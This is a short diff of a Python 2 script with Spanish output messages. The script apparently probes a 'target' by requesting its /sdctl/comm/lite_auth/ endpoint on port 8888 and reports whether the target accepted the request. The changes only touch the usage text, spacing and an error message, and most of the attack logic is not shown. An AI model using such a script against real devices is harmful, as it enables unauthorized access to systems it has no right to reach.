@@ -11,7 +11,7 @@
 import requests, sys, json, pprint, time, os
 
 if len(sys.argv) != 2:
-        print "\nUso: python " + sys.argv[0] + ' <ip_address>\n'
+        print "\nUso: python " + sys.argv[0] + ' http://ip:8888\n'
         sys.exit(0)
 
 def get_identifier(r_json):
@@ -59,6 +59,7 @@ if __name__ == '__main__':
 
         accept_me = url + '/sdctl/comm/lite_auth/'
 	print "\n[*] Enviando petición al objetivo..\n"
+
 	try:
 	      	r = s.get(accept_me)
 	        r_json = json.loads(r.content)
@@ -88,6 +89,6 @@ if __name__ == '__main__':
 	        	print "El objetivo ha rechazado nuestra petición, chico listo...\n"
 		        os.system('setterm -cursor on')
         except:
-        	print "\nError... ¿tal vez la IP no está activa?\n"
+        	print "Se ha producido un error...\n"
 	        os.system('setterm -cursor on')
                 sys.exit(0)
